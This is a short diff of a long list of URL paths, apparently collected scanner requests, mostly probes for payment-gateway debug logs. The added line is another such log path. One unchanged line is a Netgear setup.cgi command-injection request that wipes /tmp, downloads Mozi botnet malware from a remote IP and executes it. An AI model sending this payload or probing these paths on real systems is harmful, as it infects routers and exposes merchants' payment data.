@@ -24824,3 +24824,4 @@ http://142.250.203.142/
 /system/logs/nmi_direct_post.class.log
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.138.150.202:40270/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /system/logs/merchant_one_debug.txt
+/system/logs/authorizenet_cim-2025-04-27-debug.log
